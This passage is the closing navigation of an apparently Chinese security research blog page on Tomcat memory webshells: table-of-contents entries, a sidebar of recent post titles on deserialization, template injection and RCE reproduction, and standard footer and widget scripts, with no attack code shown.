href="#Listener%E5%88%86%E7%B1%BB"><span class="toc-number">2.7.1.</span> <span class="toc-text">Listener分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#listenerStart"><span class="toc-number">2.7.2.</span> <span class="toc-text">listenerStart</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Listener%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.7.3.</span> <span class="toc-text">Listener内存马实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Valve%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.8.</span> <span class="toc-text">Valve内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pineline"><span class="toc-number">2.8.1.</span> <span class="toc-text">Pineline</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Valve%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.8.2.</span> <span class="toc-text">Valve内存马实例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Handlebars AST注入"/></a><div class="content"><a class="title" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入">Handlebars AST注入</a><time datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dubbo反序列化漏洞研究"/></a><div class="content"><a class="title" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究">Dubbo反序列化漏洞研究</a><time datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yii2最新反序列化POP链分析"/></a><div class="content"><a class="title" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析">Yii2最新反序列化POP链分析</a><time datetime="2021-06-03T15:09:56.000Z" title="Created 2021-06-03 23:09:56">2021-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laravel Debug mode RCE复现"/></a><div class="content"><a class="title" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现">Laravel Debug mode RCE复现</a><time datetime="2021-05-28T06:15:46.000Z" title="Created 2021-05-28 14:15:46">2021-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>